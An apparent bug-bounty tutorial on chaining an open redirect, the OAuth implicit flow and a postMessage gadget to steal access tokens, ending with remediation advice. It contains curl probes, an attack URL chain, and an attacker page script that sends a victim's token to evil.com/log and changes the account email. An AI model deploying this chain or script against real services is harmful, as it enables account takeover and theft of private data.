OAuth Dirty Dancing: Open Redirect to Token Theft

Inspired by xssdoctor's OAuth research · Pattern found on Uber, Calendly, and numerous OAuth implementations

Vulnerability

Multiple subdomains accept unvalidated redirect parameters (return_to, next_url). When chained with OAuth implicit flow (response_type=token), an attacker can steal access tokens via the URL fragment. Adding a postMessage gadget on the error page enables stealing tokens even when the redirect_uri is partially validated.

The Three Components

Component 1: Open Redirect

Admin and internal subdomains often have weaker redirect validation than the main app:

# admin.target.com accepts any external URL in return_to
curl -sv "https://admin.target.com/identity/?return_to=https://evil.com" \
  2>&1 | grep "location:"
# Location: https://evil.com

# bonjour.target.com accepts any URL in next_url
curl -sv "https://bonjour.target.com/?next_url=https://evil.com" \
  2>&1 | grep "location:"
# Location: https://evil.com

# Staging environments often have NO validation at all
curl -sv "https://admin-staging.target.com/identity/?return_to=https://evil.com" \
  2>&1 | grep "location:"
# Location: https://evil.com

Component 2: OAuth Implicit Flow

If the OAuth provider supports response_type=token (implicit grant), the access token is placed in the URL fragment of the redirect URI. The fragment travels with redirects:

# Normal OAuth flow (authorization code - safe)
https://auth.target.com/oauth/authorize?
  client_id=app&
  response_type=code&           # Code in query string
  redirect_uri=https://app.target.com/callback

# Implicit flow (token in fragment - dangerous)
https://auth.target.com/oauth/authorize?
  client_id=app&
  response_type=token&          # Token in URL fragment!
  redirect_uri=https://app.target.com/callback

# After auth, user is redirected to:
# https://app.target.com/callback#access_token=eyJhbG...&token_type=bearer

Component 3: PostMessage Gadget

Many OAuth callback/error pages include analytics scripts that leak the page URL via postMessage. Even if the redirect doesn't directly send the token to the attacker, a postMessage gadget can:

// Common analytics pattern on OAuth error pages
window.__analytics = { pageUrl: window.location.href };

window.addEventListener('message', function(e) {
  if (e.data.type === 'getAnalytics') {
    // Responds to ANY origin with the full page URL
    // including the #access_token fragment!
    e.source.postMessage({
      type: 'analyticsData',
      url: window.__analytics.pageUrl  // Contains the token!
    }, '*');
  }
});

The Dirty Dancing Chain

Bug 1: Open redirect on admin.target.com via return_to parameter

Bug 2: OAuth supports implicit flow (response_type=token)

Bug 3: PostMessage gadget on error/callback page leaks URL to any origin

Result: One-click account takeover — victim clicks a link, attacker gets their access token

The Attack

Attack Flow: Open Redirect + Implicit Flow

1

Attacker crafts OAuth URL: auth.target.com/oauth/authorize?response_type=token&redirect_uri=https://admin.target.com/identity/?return_to=https://evil.com/steal

↓
2

Victim clicks the link, authenticates on auth.target.com

↓
3

OAuth server redirects to admin.target.com/identity/?return_to=https://evil.com/steal#access_token=eyJ...

↓
4

admin.target.com follows the open redirect to evil.com/steal#access_token=eyJ...

↓
5

Attacker's page reads window.location.hash — access token captured!

Attacker's Token Capture Page

<!-- https://evil.com/steal -->
<script>
// Extract token from URL fragment
const fragment = window.location.hash.substring(1);
const params = new URLSearchParams(fragment);
const token = params.get('access_token');

if (token) {
  // Exfiltrate the token
  fetch('https://evil.com/log', {
    method: 'POST',
    body: JSON.stringify({ token: token })
  });

  // Use token to access victim's account
  fetch('https://api.target.com/v1/me', {
    headers: { 'Authorization': 'Bearer ' + token }
  }).then(r => r.json()).then(profile => {
    // Change victim's email for full ATO
    fetch('https://api.target.com/v1/me', {
      method: 'PUT',
      headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  });
}
</script>

Advanced: Response Type Juggling

Some OAuth providers accept multiple response types in one request. This enables "response type juggling" where the attacker forces the server to return both a code AND a token:

# Request both code and token
response_type=code,token
# Server returns code in query AND token in fragment

# Or hybrid flow
response_type=code,id_token
# Server returns code in query AND id_token in fragment

# Even if redirect_uri is validated for 'code' flow,
# the 'token' in the fragment still travels with the redirect!

Why It Matters

OAuth token theft is one of the highest-impact client-side bugs. A stolen access token gives the attacker full API access as the victim — read private data, change account settings, make purchases, send messages. Many programs pay $5K-$15K for OAuth token theft chains. The key insight is that three medium-severity bugs chain into a critical account takeover.

Bug Bounty Tip

When you find an open redirect, immediately check if the same domain has OAuth endpoints. Test response_type=token and response_type=code,token. If the OAuth server returns tokens in the fragment and the redirect carries the fragment to your domain, you have a high-severity chain. Also look for postMessage gadgets on OAuth callback/error pages — analytics scripts are the most common source.

Remediation

  • Disable implicit flow (response_type=token) — use authorization code flow with PKCE
  • Validate redirect URIs with exact-match allowlist, not prefix/substring checks
  • Never allow open redirects on domains that participate in OAuth flows
  • Remove postMessage gadgets from OAuth callback/error pages
  • Add interstitial warning pages for external redirects
